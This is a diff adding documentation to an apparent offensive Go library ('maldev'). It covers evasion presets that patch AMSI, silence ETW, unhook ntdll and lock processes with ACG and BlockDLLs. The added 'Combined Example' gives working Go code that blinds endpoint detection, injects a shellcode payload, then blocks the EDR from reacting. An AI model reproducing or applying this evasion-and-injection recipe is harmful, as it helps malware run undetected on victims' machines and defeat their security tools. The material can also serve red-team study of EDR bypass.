@@ -2,12 +2,42 @@
 
 [<- Back to Evasion](README.md)
 
-**Package:** `github.com/oioio-space/maldev/evasion/preset`
+**Package:** `evasion/preset`
 **Platform:** Windows only
+**Detection:** Varies by preset (Low for Minimal, Medium for Stealth, High for Aggressive)
 
 Preset bundles the most common evasion techniques into three opinionated
 configurations keyed on risk tolerance. Each preset returns
 `[]evasion.Technique` for use with `evasion.ApplyAll()`.
+
+---
+
+## For Beginners
+
+Evasion rarely works in isolation — AMSI alone misses ETW, ETW alone misses userland hooks. Presets are pre-composed bundles (`Minimal`, `Stealth`, `Aggressive`) that apply a coherent set of techniques in one call. Pick one, ship it, don't micromanage the pieces.
+
+---
+
+## How It Works
+
+A preset is just a function returning `[]evasion.Technique`. `evasion.ApplyAll` iterates the slice and invokes each technique's `Apply()` in order, collecting per-technique failures into a map. Nothing magic: the value is curation, not new code.
+
+```mermaid
+flowchart LR
+    A[preset.Stealth] --> B["[]evasion.Technique<br/>amsi + etw + 10x unhook"]
+    B --> C["evasion.ApplyAll(slice, caller)"]
+    C --> D{"each .Apply()"}
+    D --> E[AMSI patched]
+    D --> F[ETW silenced]
+    D --> G[ntdll prologues restored]
+    D --> H["errors map[name]error"]
+```
+
+- `preset.Minimal()` — AMSI + ETW only. No disk reads, no mitigation policies.
+- `preset.Stealth()` — Minimal + classic unhook of the 10 functions in `unhook.CommonHookedFunctions`.
+- `preset.Aggressive()` — full AMSI, full ETW, full `.text` unhook, ACG, BlockDLLs. Irreversible.
+
+Order matters for Aggressive — ACG and BlockDLLs permanently restrict the process, so all RWX allocation and injection must be done before applying it.
 
 ---
 
@@ -213,3 +243,60 @@ evasion.ApplyAll(techniques, nil)
 | EDR with heavy hook coverage suspected | Aggressive (Full unhook) | Full .text replacement vs. targeted 5-byte patches |
 | Constrained environment, compatibility required | Minimal | No disk reads, no irreversible changes |
 | Custom: known hook set | Manual composition | Build from individual techniques for minimal footprint |
+
+---
+
+## Combined Example
+
+Apply `preset.Stealth()` to unhook injection primitives, detonate a
+shellcode payload, then lock the process down with `preset.Aggressive()`
+so an EDR agent cannot counter-inject a monitoring DLL afterwards.
+
+```go
+package main
+
+import (
+    "log"
+
+    "github.com/oioio-space/maldev/evasion"
+    "github.com/oioio-space/maldev/evasion/preset"
+    "github.com/oioio-space/maldev/inject"
+    wsyscall "github.com/oioio-space/maldev/win/syscall"
+)
+
+func run(shellcode []byte) error {
+    caller := wsyscall.New(wsyscall.MethodIndirect, wsyscall.NewTartarus())
+    defer caller.Close()
+
+    // 1. Stealth first — AMSI/ETW silenced + Nt* prologues restored.
+    //    The unhook pass uses indirect syscalls via `caller`, so the
+    //    restore itself does not touch hooked NtProtectVirtualMemory.
+    if errs := evasion.ApplyAll(preset.Stealth(), caller); len(errs) > 0 {
+        for name, err := range errs {
+            log.Printf("stealth: %s: %v", name, err)
+        }
+    }
+
+    // 2. Inject while RWX allocation is still legal.
+    if err := inject.ThreadPoolExec(shellcode); err != nil {
+        return err
+    }
+
+    // 3. Aggressive last — ACG + BlockDLLs lock the process.
+    //    No further VirtualAlloc(PAGE_EXECUTE_*) possible after this.
+    evasion.ApplyAll(preset.Aggressive(), caller)
+    return nil
+}
+```
+
+Layered benefit: Stealth removes the EDR's ability to observe the
+injection (hooks gone, AMSI silent, ETW off), and Aggressive removes
+its ability to react afterwards (ACG blocks code injection, BlockDLLs
+blocks its module load) — the two presets cover detection and
+remediation without overlapping.
+
+---
+
+## API Reference
+
+See [evasion.md](../../evasion.md#preset----composable-technique-presets)
